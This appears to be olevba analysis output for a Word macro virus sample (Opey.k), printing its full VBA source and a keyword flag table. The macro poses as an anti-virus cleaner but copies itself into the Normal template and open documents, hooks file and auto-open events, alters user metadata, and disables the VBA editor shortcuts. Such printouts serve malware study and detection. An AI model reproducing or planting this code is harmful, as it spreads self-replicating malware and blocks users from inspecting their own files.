olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.k-d1ba3823657c17ce9d6b64bcf5b60455a28a382d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.k-d1ba3823657c17ce9d6b64bcf5b60455a28a382d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Detect_Virus.bas 
in file: Virus.MSWord.Opey.k-d1ba3823657c17ce9d6b64bcf5b60455a28a382d - OLE stream: 'Macros/VBA/Detect_Virus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub detectS()

   ' ANTI-MACRO-VIRUS '99
   ' "Be nice!"

   
   
On Error Resume Next
Call Detect_Virus
NTInfected = False
OK = False
For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            VIRUS_NAME = NormalTemplate.VBProject.VBComponents(i).Name
            If (VIRUS_NAME = "THE_UNKNOWN") Or (VIRUS_NAME = "A_OPEY_05") Or (VIRUS_NAME = "A_OPEY_03") _
            Or (VIRUS_NAME = "Cartman") Or (VIRUS_NAME = "detect") Then
            counter = counter + 1
               MsgBox ("ALERT :  " + VIRUS_NAME + "  macro virus detected!")
               Application.VBE.ActiveVBProject.VBComponents.Remove Application.VBE.ActiveVBProject.VBComponents(VIRUS_NAME)
               MsgBox (VIRUS_NAME + " macro virus found and cleaned.")
               Key = True
            End If
            If VIRUS_NAME = "Detect_Virus" Then NTInfected = True
            If (VIRUS_NAME <> "Detect_Virus") And (VIRUS_NAME <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=VIRUS_NAME, Object:=wdOrganizerObjectProjectItems
Next i
      For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                VIRUS_NAME = opendoc.VBProject.VBComponents(j).Name
                  If (VIRUS_NAME = "THE_UNKNOWN") Or (VIRUS_NAME = "A_OPEY_05") Or (VIRUS_NAME = "A_OPEN_03") _
                    Or (VIRUS_NAME = "Cartman") Or (VIRUS_NAME = "detect") Then
                    MsgBox ("ALERT :  " + VIRUS_NAME + "  macro virus detected!")
                    Application.VBE.ActiveVBProject.VBComponents.Remove Application.VBE.ActiveVBProject.VBComponents(VIRUS_NAME)
                    MsgBox (VIRUS_NAME + " macro virus found and cleaned.")
                    Key = True
                  End If
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="Detect_Virus", Object:=wdOrganizerObjectProjectItems
                End If
            End With
           Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Detect_Virus", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
      If Key = True Then
        ActiveDocument.Save
        Application.Quit
      End If
End Sub
Sub Detect_Virus()
    On Error Resume Next
    Application.UserName = "ANTI-VIRUS PROTECTION"
    Application.UserAddress = ""
    Application.UserInitials = ""
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Detector"
        .Keywords = "Check your file."
        .Title = ""
        .Execute
    End With
    With Options
        .ConfirmConversions = True
        .VirusProtection = True
        .SaveNormalPrompt = True
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call detectS
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call detectS
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call detectS
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call detectS
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call detectS
End Sub
Sub AutoExec()
    On Error Resume Next
    Call detectS
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call detectS
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call detectS
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call detectS
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call detectS
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

